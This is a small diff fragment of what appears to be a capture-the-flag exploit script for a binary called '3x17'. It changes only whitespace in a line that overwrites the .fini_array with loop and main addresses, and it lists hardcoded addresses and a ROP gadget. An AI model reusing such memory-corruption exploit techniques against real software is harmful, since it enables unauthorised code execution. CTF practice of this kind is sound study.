@@ -15,7 +15,7 @@ main_addr = 0x0000000000401b6d
 loop_func_addr = 0x0000000000402960
 main_leave_ret_addr = 0x0000000000401c4b
 
-send_data(fini_array_addr,p64(loop_func_addr)+p64(main_addr))
+send_data(fini_array_addr, p64(loop_func_addr)+p64(main_addr))
 
 #ROPgadget --binary 3x17
 pop_rax_addr = 0x000000000041e4af #pop rax ; ret
